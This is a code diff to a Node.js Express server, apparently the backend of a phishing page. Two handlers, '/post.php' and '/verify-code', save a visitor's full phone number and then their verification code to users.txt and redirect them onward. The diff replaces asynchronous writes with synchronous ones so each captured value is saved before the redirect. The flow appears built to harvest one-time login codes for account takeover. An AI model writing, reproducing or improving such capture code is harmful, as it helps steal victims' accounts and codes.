@@ -26,18 +26,17 @@ app.post('/post.php', (req, res) => {
   // Format the data
   const userData = `Timestamp: ${timestamp}\nPhone Number: ${fullPhone}\n${'='.repeat(50)}\n`;
   
-  // Append to users.txt file
-  fs.appendFile(usersFile, userData, (err) => {
-    if (err) {
-      console.error('Error writing to file:', err);
-      return res.status(500).send('Error saving data');
-    }
-    
+  // Use writeFile synchronously to ensure it completes before redirect
+  try {
+    fs.appendFileSync(usersFile, userData);
     console.log('Phone number saved:', { phone: fullPhone, timestamp });
     
-    // Redirect to verification page
+    // Redirect to verification page after successful write
     res.redirect('/verification.html');
-  });
+  } catch (err) {
+    console.error('Error writing to file:', err);
+    return res.status(500).send('Error saving data');
+  }
 });
 
 // Handle POST request from verification form
@@ -49,18 +48,17 @@ app.post('/verify-code', (req, res) => {
   // Format the verification code data
   const codeData = `Timestamp: ${timestamp}\nVerification Code: ${code}\n${'='.repeat(50)}\n`;
   
-  // Append to users.txt file
-  fs.appendFile(usersFile, codeData, (err) => {
-    if (err) {
-      console.error('Error writing to file:', err);
-      return res.status(500).send('Error saving data');
-    }
-    
+  // Use writeFile synchronously to ensure it completes before redirect
+  try {
+    fs.appendFileSync(usersFile, codeData);
     console.log('Verification code saved:', { code, timestamp });
     
-    // Redirect back to login page (or a success page)
+    // Redirect back to login page after successful write
     res.redirect('/');
-  });
+  } catch (err) {
+    console.error('Error writing to file:', err);
+    return res.status(500).send('Error saving data');
+  }
 });
 
 // Optional: View all saved users (for testing)
